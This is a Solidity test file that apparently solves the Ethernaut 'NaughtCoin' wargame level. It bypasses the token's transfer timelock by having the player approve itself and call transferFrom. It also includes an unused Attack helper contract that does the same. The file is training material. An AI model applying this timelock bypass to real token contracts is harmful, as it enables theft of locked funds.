// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        //Attack attack = new Attack(levelAddress);
        //level.approve(address(attack), level.balanceOf(player));
        //attack.attack();
        level.approve(player, level.balanceOf(player));
        level.transferFrom(player, address(this), level.balanceOf(player));
        vm.stopPrank();
    }
}

contract Attack {
    NaughtCoin private level;
    constructor(address _target) public payable {
        level = NaughtCoin(_target);
    }

    function attack() public {
        level.transferFrom(msg.sender, address(this), level.balanceOf(msg.sender));
    }
}